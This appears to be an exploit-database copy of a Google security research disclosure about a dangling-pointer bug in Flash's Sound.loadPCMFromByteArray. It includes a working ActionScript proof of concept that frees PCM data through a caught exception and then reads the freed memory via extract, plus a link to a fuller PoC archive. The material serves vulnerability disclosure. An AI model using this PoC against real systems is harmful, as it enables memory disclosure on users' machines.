@@ -1,0 +1,33 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=698
+
+There is a dangling pointer that can be read, but not written to in loadPCMFromByteArray. A minimal PoC is as follows:
+
+	var s = new Sound();
+	var b = new ByteArray();
+	for( var i = 0; i < 1600; i++){
+		b.writeByte(1);
+	}
+	b.position = 0;
+	s.loadPCMFromByteArray(b, 100, "float", false, 2.0);
+	var c = new ByteArray();
+	for(var i = 0; i < 2; i++){
+			c.writeByte(1);	
+	}
+	c.position = 0;
+	try{
+		s.loadPCMFromByteArray(c, 1, "float", false, 2.0);
+	}catch(e:Error){		
+		trace(e.message);
+	}
+			
+	var d = new ByteArray();
+	s.extract(d, 1, 0);
+
+The PoC first loads PCM bytes correctly, setting an internal pointer to them. It then loads PCM bytes again, with a specific array length that passes the array length check, but then causes a exception to be thrown when reading the byte array. This causes the pointer to the original PCM array to be deleted, but then the function exits due to an exception before the pointer is set again. If the exception is caught, the sound object containing the dangling pointer can be used again. The sound.extract method reads directly out of the location the dangling pointer points to.
+
+A full PoC and swf are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39462.zip
+
